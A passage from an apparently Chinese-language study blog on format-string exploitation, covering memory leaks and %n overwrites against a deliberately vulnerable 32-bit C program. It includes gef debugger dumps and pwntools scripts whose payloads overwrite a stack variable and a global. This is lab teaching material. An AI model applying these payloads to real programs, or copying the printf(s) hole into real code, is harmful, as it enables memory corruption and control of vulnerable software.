class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可见程序并没有如同预期一样输出printf的地址。</p><p>有时候，我们需要对我们输入的格式化字符串进行填充，来使得我们想要打印的地址内容位于机器字长整数倍的地址处，一般来说，类似于下面的这个样子。</p><pre><code>[padding][addr]</code></pre><p>注意</p><blockquote><p>我们在gef中使用got命令的时候，已经打印出了printf的got地址</p><p>0804a00c R_386_JUMP_SLOT   <a href="mailto:printf@GLIBC_2.0">printf@GLIBC_2.0</a></p><p>但是我们不能直接在命令行输入\x0c\xa0\x04\x08%4$s 这是因为虽然前面的确实是printf@got的地址，但是，scanf函数并不会将其识别为对应的字符串，而是会将\,x,0,c分别作为一个字符进行读入。下面就是错误的例子。</p></blockquote><pre class="line-numbers language-shell"><code class="language-shell">gef➤  rStarting program: /home/devil/leakmemory \\x0c\\xa0\\x04\\x08%10$s00000001.22222222.ffffffff.\\x0c\\xa0\\x04\\x08%10$sProgram received signal SIGSEGV, Segmentation fault.__strlen_ia32 () at ../sysdeps/i386/i686/multiarch/../../i586/strlen.S:9494    ../sysdeps/i386/i686/multiarch/../../i586/strlen.S: No such file or directory.[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$eax   : 0x30785c5c ("\\x0"?)$ebx   : 0x0       $ecx   : 0xf7fb6000  →  0x001b1db0$edx   : 0x0       $esp   : 0xffffc4ec  →  0xf7e45977  →  <printf_positional+7575> add esp, 0x10$ebp   : 0xffffca98  →  0xffffcfb8  →  0xffffd078  →  0x00000000$esi   : 0xffffc680  →  0xffffffff$edi   : 0xf7fb6d60  →  0xfbad2a84$eip   : 0xf7e795f1  →  <__strlen_ia32+49> mov ecx, DWORD PTR [eax]$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow RESUME virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ───────────────────────────────────────────────────────────────────── stack ────0xffffc4ec│+0x0000: 0xf7e45977  →  <printf_positional+7575> add esp, 0x10     ← $esp0xffffc4f0│+0x0004: 0x30785c5c ("\x0"?)0xffffc4f4│+0x0008: 0x000000000xffffc4f8│+0x000c: 0x00000028 ("("?)0xffffc4fc│+0x0010: 0x000000000xffffc500│+0x0014: 0xffffd008  →  "\x0c\xa0\x04\x08%10$s"0xffffc504│+0x0018: 0x000000000xffffc508│+0x001c: 0x00000000─────────────────────────────────────────────────────────────── code:x86:32 ────   0xf7e795e7 <__strlen_ia32+39> xor    BYTE PTR [edi], cl   0xf7e795e9 <__strlen_ia32+41> test   BYTE PTR [eax+0x40000000], cl   0xf7e795ef <__strlen_ia32+47> xor    edx, edx → 0xf7e795f1 <__strlen_ia32+49> mov    ecx, DWORD PTR [eax]   0xf7e795f3 <__strlen_ia32+51> add    eax, 0x4   0xf7e795f6 <__strlen_ia32+54> sub    edx, ecx   0xf7e795f8 <__strlen_ia32+56> add    ecx, 0xfefefeff   0xf7e795fe <__strlen_ia32+62> dec    edx   0xf7e795ff <__strlen_ia32+63> jae    0xf7e79659 <__strlen_ia32+153>─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: "leakmemory", stopped 0xf7e795f1 in __strlen_ia32 (), reason: SIGSEGV───────────────────────────────────────────────────────────────────── trace ────[#0] 0xf7e795f1 → __strlen_ia32()[#1] 0xf7e45977 → printf_positional(s=0xf7fb6d60 <_IO_2_1_stdout_>, format=0xffffd008 "\\\\x0c\\\\xa0\\\\x04\\\\x08%10$s", readonly_format=0x0, ap=<optimized out>, ap_savep=0xffffcb7c, done=0x14, nspecs_done=0x0, lead_str_end=0xffffd01c "%10$s", work_buffer=0xffffcbb8 "@\001", save_errno=0x0, grouping=0x0, thousands_sep=0xf7f5f7d2 "")[#2] 0xf7e46401 → _IO_vfprintf_internal(s=0xf7fb6d60 <_IO_2_1_stdout_>, format=<optimized out>, ap=0xffffcfe4 "\b\320\377\377\030\331\377\367\377\265", <incomplete sequence \360>)[#3] 0xf7e4d696 → __printf(format=0xffffd008 "\\\\x0c\\\\xa0\\\\x04\\\\x08%10$s")[#4] 0x804852c → main()────────────────────────────────────────────────────────────────────────────────gef➤  x/x 0xffffd0080xffffd008:    0x30785c5c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h3><p>上面，我们已经展示了如何利用格式化字符串来泄露栈内存以及任意地址内存，那么我们有没有可能修改栈上变量的值呢，甚至修改任意地址变量的内存呢? 答案是可行的，只要变量对应的地址可写，我们就可以利用格式化字符串来修改其对应的数值。这里我们可以想一下格式化字符串中的类型</p><blockquote><p>%n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</p></blockquote><p>通过这个类型参数，再加上一些小技巧，我们就可以达到我们的目的，这里仍然分为两部分，<strong>一部分为覆盖栈上的变量，第二部分为覆盖指定地址的变量</strong>。</p><p>这里我们给出如下的程序来介绍相应的部分。</p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">456</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">789</span><span class="token punctuation">;</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>    #<span class="token function">scanf</span><span class="token punctuation">(</span><span class="token punctuation">)</span>函数要放在<span class="token function">printf</span><span class="token punctuation">(</span><span class="token punctuation">)</span>前面，确保第一次在printf中断时，程序已经读入格式化字符串  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"modified c."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"modified a for a small number."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">==</span> <span class="token number">0x12345678</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"modified b for a big number!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>这里和wiki上有点区别，就在于第一个scanf(“%s”,s)和printf(“%p\n”,&amp;c)的顺序。wiki上是printf在前，但是我按照他那样编译调试的时候stack中不能同时显示c的地址和格式化字符串的地址，所以我换了一下位置进行编译调试。但在后面修改c的值的时候，用此脚本编译出来的程序在接收c地址的时候出了点问题。</p></blockquote><p>编译成32位程序</p><pre class="line-numbers language-sh"><code class="language-sh">devil@ubuntu:~$ gcc -m32 -fno-stack-protector -no-pie -o overflow overflow.coverflow.c: In function ‘main’:overflow.c:9:10: warning: format not a string literal and no format arguments [-Wformat-security]   printf(s);          ^<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>无论是覆盖哪个地址的变量，我们基本上都是构造类似如下的payload</p><pre class="line-numbers language-sh"><code class="language-sh">...[overwrite addr]....%[overwrite offset]$n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中…表示我们的填充内容，overwrite addr表示我们所要覆盖的地址，overwrite offset地址表示我们所要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数。所以一般来说，也是如下步骤</p><ul><li>确定覆盖地址</li><li>确定相对偏移</li><li>进行覆盖</li></ul><h4 id="覆盖栈内存"><a href="#覆盖栈内存" class="headerlink" title="覆盖栈内存"></a>覆盖栈内存</h4><h5 id="确定覆盖地址"><a href="#确定覆盖地址" class="headerlink" title="确定覆盖地址"></a>确定覆盖地址</h5><p>首先，我们自然是来想办法知道栈变量 c 的地址。由于目前几乎上所有的程序都开启了 aslr 保护，所以栈的地址一直在变，所以我们这里故意输出了 c 变量的地址。</p><h5 id="确定相对偏移"><a href="#确定相对偏移" class="headerlink" title="确定相对偏移"></a>确定相对偏移</h5><p>其次，我们来确定一下存储格式化字符串的地址是printf将要输出的第几个参数()。这里我们通过之前的泄露栈变量数值的方法来进行操作。通过调试</p><pre class="line-numbers language-shell"><code class="language-shell">devil@ubuntu:~$ gdb overflowgef➤  b printfBreakpoint 1 at 0x8048340gef➤  rStarting program: /home/devil/overflow %d%dBreakpoint 1, __printf (format=0x80485c3 "%p\n") at printf.c:2828    printf.c: No such file or directory.[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$eax   : 0xffffd06c  →  0x00000315$ebx   : 0x0       $ecx   : 0x1       $edx   : 0xf7fb787c  →  0x00000000$esp   : 0xffffcfec  →  0x080484c8  →  <main+61> add esp, 0x10$ebp   : 0xffffd078  →  0x00000000$esi   : 0xf7fb6000  →  0x001b1db0$edi   : 0xf7fb6000  →  0x001b1db0$eip   : 0xf7e4d670  →  <printf+0> call 0xf7f23b59 <__x86.get_pc_thunk.ax>$eflags: [carry parity ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ───────────────────────────────────────────────────────────────────── stack ────0xffffcfec│+0x0000: 0x080484c8  →  <main+61> add esp, 0x10     ← $esp0xffffcff0│+0x0004: 0x080485c3  →  "%p\n"0xffffcff4│+0x0008: 0xffffd06c  →  0x000003150xffffcff8│+0x000c: 0x000000c20xffffcffc│+0x0010: 0xf7e946bb  →  <handle_intel+107> add esp, 0x100xffffd000│+0x0014: 0xffffd02e  →  0xffff0000  →  0x000000000xffffd004│+0x0018: 0xffffd12c  →  0xffffd30a  →  "XDG_VTNR=7"0xffffd008│+0x001c: "%d%d"─────────────────────────────────────────────────────────────── code:x86:32 ────   0xf7e4d667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]   0xf7e4d66d                  nop       0xf7e4d66e                  xchg   ax, ax → 0xf7e4d670 <printf+0>       call   0xf7f23b59 <__x86.get_pc_thunk.ax>   ↳  0xf7f23b59 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]      0xf7f23b5c <__x86.get_pc_thunk.ax+3> ret          0xf7f23b5d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]      0xf7f23b60 <__x86.get_pc_thunk.dx+3> ret          0xf7f23b61 <__x86.get_pc_thunk.si+0> mov    esi, DWORD PTR [esp]      0xf7f23b64 <__x86.get_pc_thunk.si+3> ret    ─────────────────────────────────────────────────────── arguments (guessed) ────__x86.get_pc_thunk.ax ()─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: "overflow", stopped 0xf7e4d670 in __printf (), reason: BREAKPOINT───────────────────────────────────────────────────────────────────── trace ────[#0] 0xf7e4d670 → __printf(format=0x80485c3 "%p\n")[#1] 0x80484c8 → main()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以发现在0xffffcff4处存储着变量c的数值(789==0x315)。继而，我们再确定格式化字符串’%d%d’的地址0xffffd008相对于printf函数的格式化字符串参数0xffffcff0的偏移为0x18，即格式化字符串地址相当于printf函数的第7个参数(0xffffcfec是printf函数的返回地址)，相当于格式化字符串的第6个参数。</p><h5 id="进行覆盖"><a href="#进行覆盖" class="headerlink" title="进行覆盖"></a>进行覆盖</h5><p>这样，第 6 个参数处的值就是存储变量 c 的地址，我们便可以利用 %n 的特征来修改 c 的值。payload 如下</p><pre><code>[address of c]%012d%6$n</code></pre><p>address of c的长度为4(32位程序)，故而我们得再输入12个字符才可以达到16个字符，以便来修改c的值为16。</p><blockquote><p>参数n,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。前面已经成果输出了16个字符了，所以在这就相当于把格式化字符串的第6个参数c的值改写成了16。</p><p>参数012d：如果width选项前缀以0，则在左侧用0填充直至达到宽度要求。这里把012d换成’a’*12也可以。</p></blockquote><p>具体脚本如下</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">forc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./overwrite'</span><span class="token punctuation">)</span>    c_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#原来是printf("%p\n",&amp;c);drop=True表示接收\n之前的值,16表示以16进制的形式。</span>    <span class="token keyword">print</span> hex<span class="token punctuation">(</span>c_addr<span class="token punctuation">)</span>    payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>c_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'%012d'</span> <span class="token operator">+</span> <span class="token string">'%6$n'</span>    <span class="token keyword">print</span> payload    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>forc<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>我用这个脚本去打我上面编译出来的程序，发现c_addr一直接收不了，因为在printf(“%p\n”,&amp;c);之前有一个scanf()语句，我发现就算是先send()一个数值也接收不到…于是我又用他的脚本编译了一次。</p></blockquote><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">456</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">789</span><span class="token punctuation">;</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"modified c."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"modified a for a small number."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">==</span> <span class="token number">0x12345678</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"modified b for a big number!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>关于pwntools里面的recvuntil脚本</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> t <span class="token operator">=</span> tube<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> t<span class="token punctuation">.</span>recv_raw <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">:</span> b<span class="token string">"Hello World!"</span><span class="token operator">>></span><span class="token operator">></span> t<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>b<span class="token string">' '</span><span class="token punctuation">)</span>b<span class="token string">'Hello '</span><span class="token operator">>></span><span class="token operator">></span> _<span class="token operator">=</span>t<span class="token punctuation">.</span>clean<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token comment" spellcheck="true"># Matches on 'o' in 'Hello'</span><span class="token operator">>></span><span class="token operator">></span> t<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token punctuation">(</span>b<span class="token string">' '</span><span class="token punctuation">,</span>b<span class="token string">'W'</span><span class="token punctuation">,</span>b<span class="token string">'o'</span><span class="token punctuation">,</span>b<span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>b<span class="token string">'Hello'</span><span class="token operator">>></span><span class="token operator">></span> _<span class="token operator">=</span>t<span class="token punctuation">.</span>clean<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token comment" spellcheck="true"># Matches expressly full string</span><span class="token operator">>></span><span class="token operator">></span> t<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>b<span class="token string">' Wor'</span><span class="token punctuation">)</span>b<span class="token string">'Hello Wor'</span><span class="token operator">>></span><span class="token operator">></span> _<span class="token operator">=</span>t<span class="token punctuation">.</span>clean<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token comment" spellcheck="true"># Matches on full string, drops match</span><span class="token operator">>></span><span class="token operator">></span> t<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>b<span class="token string">' Wor'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>b<span class="token string">'Hello'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p>结果如下</p><pre class="line-numbers language-shell"><code class="language-shell">devil@ubuntu:~$ python exp.py [+] Starting local process './overflow_1': pid 38170xff9583ac[*] running in new terminal: /usr/bin/gdb -q  "./overflow_1" 3817 -x "/tmp/pwnyrtF2W.gdb"[+] Waiting for debugger: Done\xac\x83\x95\xffaaaaaaaaaaaamodified c.[*] Switching to interactive mode[*] Process './overflow_1' stopped with exit code 0 (pid 3817)[*] Got EOF while reading in interactive<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>terminal里面的结果如下</p><pre class="line-numbers language-shell"><code class="language-shell">gef➤  b printfBreakpoint 1 at 0xf7deb670: file printf.c, line 28.gef➤  cContinuing.Breakpoint 1, __printf (format=0xff958348 "\254\203\225\377", 'a' <repeats 12 times>, "%6$n") at printf.c:2828    printf.c: No such file or directory.[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$eax   : 0xff958348  →  0xff9583ac  →  0x00000315$ebx   : 0x0       $ecx   : 0x1       $edx   : 0xf7f5587c  →  0x00000000$esp   : 0xff95832c  →  0x080484d7  →  <main+76> add esp, 0x10$ebp   : 0xff9583b8  →  0x00000000$esi   : 0xf7f54000  →  0x001b1db0$edi   : 0xf7f54000  →  0x001b1db0$eip   : 0xf7deb670  →  <printf+0> call 0xf7ec1b59 <__x86.get_pc_thunk.ax>$eflags: [carry parity ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ───────────────────────────────────────────────────────────────────── stack ────0xff95832c│+0x0000: 0x080484d7  →  <main+76> add esp, 0x10     ← $esp0xff958330│+0x0004: 0xff958348  →  0xff9583ac  →  0x000003150xff958334│+0x0008: 0xff958348  →  0xff9583ac  →  0x000003150xff958338│+0x000c: 0x000000c20xff95833c│+0x0010: 0xf7e326bb  →  <handle_intel+107> add esp, 0x100xff958340│+0x0014: 0xff95836e  →  0xffff00000xff958344│+0x0018: 0xff95846c  →  0xff95a323  →  "QT_QPA_PLATFORMTHEME=appmenu-qt5"0xff958348│+0x001c: 0xff9583ac  →  0x00000315─────────────────────────────────────────────────────────────── code:x86:32 ────   0xf7deb667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]   0xf7deb66d                  nop       0xf7deb66e                  xchg   ax, ax → 0xf7deb670 <printf+0>       call   0xf7ec1b59 <__x86.get_pc_thunk.ax>   ↳  0xf7ec1b59 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]      0xf7ec1b5c <__x86.get_pc_thunk.ax+3> ret          0xf7ec1b5d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]      0xf7ec1b60 <__x86.get_pc_thunk.dx+3> ret          0xf7ec1b61 <__x86.get_pc_thunk.si+0> mov    esi, DWORD PTR [esp]      0xf7ec1b64 <__x86.get_pc_thunk.si+3> ret    ─────────────────────────────────────────────────────── arguments (guessed) ────__x86.get_pc_thunk.ax ()─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: "overflow_1", stopped 0xf7deb670 in __printf (), reason: BREAKPOINT───────────────────────────────────────────────────────────────────── trace ────[#0] 0xf7deb670 → __printf(format=0xff958348 "\254\203\225\377", 'a' <repeats 12 times>, "%6$n")[#1] 0x80484d7 → main()────────────────────────────────────────────────────────────────────────────────gef➤  cContinuing.[Inferior 1 (process 3817) exited normally]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果输出modified c，说明c的值的确被修改成了16.</p><h4 id="覆盖任意地址内存"><a href="#覆盖任意地址内存" class="headerlink" title="覆盖任意地址内存"></a>覆盖任意地址内存</h4><h5 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h5><p>首先，我们来考虑一下如何修改data段的变量为一个较小的数字，比如说，<strong>小于机器字长的数字</strong>。这里以 2 为例。可能会觉得这其实没有什么区别，可仔细一想，真的没有么？如果我们还是将要覆盖的地址放在最前面，那么将直接占用机器字长个 (4 或 8) 字节。显然，无论之后如何输出，都只会比 4 大。</p><blockquote><p>或许我们可以使用整型溢出来修改对应的地址的值，但是这样将面临着我们得一次输出大量的内容。而这，一般情况下，基本都不会攻击成功。</p></blockquote><p>那么我们应该怎么做呢？再仔细想一下，我们有必要将所要覆盖的变量的地址放在字符串的最前面么？似乎没有，我们当时只是为了寻找偏移，所以才把 tag 放在字符串的最前面，如果我们把 tag 放在中间，其实也是无妨的。类似的，我们把地址放在中间，只要能够找到对应的偏移，其照样也可以得到对应的数值。前面已经说了我们的格式化字符串对应的地址为格式化字符串的第 6 个参数。由于我们想要把 2 写到对应的地址处，故而格式化字符串的前面的字节必须是</p><pre class="line-numbers language-c"><code class="language-c">aa<span class="token operator">%</span>k$nxx    <span class="token comment" spellcheck="true">//'k$'表示获取格式化字符串中的第k个参数，'%n'表示把已经成功输出的字符个数写入对应的整型指针参数所指的变量。这里已经成功输出的字符为'aa'，所以把2写入地址为a_addr处，也就是把a的值覆盖为2.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时对应的存储的格式化字符串(%k$nxx)已经占据了6个字符的位置，如果我们再添加两个字符aa，那么其实aa%k就是第6个参数(4个字符为1个参数)，$nxx其实就是第7个参数，后面我们如果跟上我们要覆盖的地址，那就是第8个参数，所以如果我们这里设置k为8，其实就可以覆盖了。</p><p>利用 ida 可以得到 a 的地址为 0x0804A024（由于 a、b 是已初始化的全局变量，因此不在堆栈中）。</p><pre class="line-numbers language-assembly"><code class="language-assembly">.data:0804A024                 public a.data:0804A024 a               dd 7Bh                  ; DATA XREF: main:loc_80484F4↑r.data:0804A028                 public b.data:0804A028 b               dd 1C8h                 ; DATA XREF: main:loc_8048510↑r.data:0804A028 _data           ends<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>故而我们可以构造如下的利用代码</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">fora</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./overflow_1'</span><span class="token punctuation">)</span>    a_addr <span class="token operator">=</span> <span class="token number">0x0804A024</span>    payload <span class="token operator">=</span> <span class="token string">'aa%8$naa'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>a_addr<span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>        sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>fora<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对应的结果如下</p><pre class="line-numbers language-shell"><code class="language-shell">devil@ubuntu:~$ python test.py [+] Starting local process './overflow_1': pid 53530xff820b7caaaa$\xa0\x04modified a for a small number.[*] Switching to interactive mode[*] Process './overflow_1' stopped with exit code 0 (pid 5353)[*] Got EOF while reading in interactive<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>小技巧：我们没有必要必须把地址放在最前面，放在哪里都可以，只要我们可以找到其对应的偏移即可。</p></blockquote><h5 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" 